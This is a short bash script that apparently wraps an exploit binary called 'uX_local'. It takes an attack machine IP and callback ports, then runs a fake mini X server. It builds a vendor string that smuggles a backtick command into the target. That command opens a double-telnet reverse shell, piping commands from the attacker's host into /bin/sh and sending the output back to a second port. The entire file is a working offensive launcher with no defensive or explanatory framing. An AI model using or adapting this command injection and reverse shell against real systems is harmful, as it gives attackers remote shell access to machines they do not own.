#!/bin/bash

usage () {
    echo "Usage: ${0}
	-l [ IP of attack machine (NO DEFAULT) ]
	-p [ call back port DEFAULT = 32177 ]
	-s [ call back port DEFAULT = 32178 ]
	-x [ port to start mini X server on DEFAULT = 12121 ]"

    echo "example: ${0} -l 192.168.1.1 -p 22222 -s 22223 -x 9999"

    die "$*"
}
die () {
    [ "$*" ] && echo -e `date -u`: "\a$*"
    exit 1
}


XPORT=0
CALLBACK_PORT=0
SPORT=0

if [ $# -lt 4 ]
then
	usage
fi

while getopts hl:p:s:x: optvar
	do
	        case "$optvar"
	        in
			h)
			   usage
			   ;;
		        l) LOCAL_IP=${OPTARG} 
			   ;;
		        p) CALLBACK_PORT=${OPTARG}
			   ;;
		        s) SPORT=${OPTARG}
			   ;;
			x) XPORT=${OPTARG}
			   ;;
		        *) usage "invalid option"
			   ;;
		esac
	done

if [ ${XPORT} = 0 ]
then
	XPORT=12121
fi

if [ ${CALLBACK_PORT} = 0 ]
then
	CALLBACK_PORT=32177
fi

if [ ${SPORT} = 0 ]
then
	SPORT=32178
fi

echo
echo "########################################"
echo "Local IP = ${LOCAL_IP}"
echo "Call back port = ${CALLBACK_PORT}"
echo "Call back port2 = ${SPORT}"
echo "Starting mini X server on port ${XPORT}"
echo "########################################"
echo


VENDOR_STR="\`TERM=vt100;export TERM;telnet ${LOCAL_IP} ${CALLBACK_PORT} 2>&1 < /dev/console | /bin/sh | telnet ${LOCAL_IP} ${SPORT} 2>&1\`" 
VENDOR_STR="\`TERM=vt100;export TERM;telnet ${LOCAL_IP} ${CALLBACK_PORT} 2>&1 < /dev/console | /bin/sh 2>&1 | telnet ${LOCAL_IP} ${SPORT} 2>&1\`"


./uX_local -e "${VENDOR_STR}" -v -p ${XPORT} -c xxx
